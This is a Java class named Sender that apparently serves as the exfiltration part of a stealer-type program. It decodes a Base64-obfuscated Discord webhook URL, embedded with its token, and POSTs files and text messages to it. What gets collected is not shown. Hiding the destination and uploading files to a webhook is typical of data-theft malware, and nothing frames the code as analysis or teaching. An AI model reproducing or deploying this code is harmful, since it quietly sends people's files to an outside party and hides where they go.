package io.github.luxotick;

import okhttp3.*;

import java.io.File;
import java.io.IOException;

import java.util.Base64;

public class Sender {
    private static final MediaType jsonMediaType = MediaType.parse("application/json; charset=utf-8");

    static String a = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA4NzQxODg2MTUwNDE3MjEzMi95RU5zdmdJd0U0MzJhUTZBU016VG4yVGNSWXh3V19adUtRcVJFMzRhRnNxZzNJMVF6YU93cmJGamJnQVdMeVJKS0QtVA==";

    public static void Sender(OkHttpClient client, File file, RequestBody requestBody) throws IOException {
        byte[] decodedBytes = Base64.getDecoder().decode(a);
        String decodedStr = new String(decodedBytes);

        Request request = new Request.Builder()
                .url(decodedStr)
                .post(requestBody)
                .build();

        Response response = client.newCall(request).execute();
        if (!response.isSuccessful()) {
            System.out.println("Failed to send file: " + file.getName() + ". Response: " + response.body().string());
        } else {
            System.out.println("File sent successfully: " + file.getName());
        }
    }


    public static void sendMessage(String message) {
        OkHttpClient httpClient = new OkHttpClient();

        byte[] decodedBytes = Base64.getDecoder().decode(a);
        String decodedStr = new String(decodedBytes);

        String json = "{\"content\":\"" + message + "\"}";
        RequestBody body = RequestBody.create(jsonMediaType, json);
        Request request = new Request.Builder()
                .url(decodedStr)
                .post(body)
                .build();
        try {
            Response response = httpClient.newCall(request).execute();
            if (!response.isSuccessful()) {
                System.out.println("Failed to send message. Response code: " + response.code());
            }
        } catch (Exception e) {
            System.out.println("Failed to send message: " + e.getMessage());
        }
    }
}
